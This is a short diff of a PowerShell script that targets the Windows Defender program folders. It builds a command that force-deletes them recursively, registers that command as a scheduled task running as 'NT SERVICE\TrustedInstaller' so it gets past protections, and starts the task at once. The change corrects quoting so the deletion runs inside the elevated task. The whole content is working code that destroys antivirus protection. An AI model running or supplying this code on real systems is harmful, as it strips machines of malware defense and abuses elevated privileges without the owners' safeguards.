@@ -9,7 +9,7 @@ $DefenderPaths = @(
   "C:\Program Files*\Windows Defender*"
 )
 
-$Task = foreach ($DefenderPath in $DefenderPaths) { Remove-Item $DefenderPath -Recurse -Force }
+$Task = 'foreach ($DefenderPath in $DefenderPaths) { Remove-Item $DefenderPath -Recurse -Force }'
 
 Register-ScheduledTask Defender -Ac (New-ScheduledTaskAction powershell $Task) -U 'NT SERVICE\TrustedInstaller'
 Start-ScheduledTask Defender
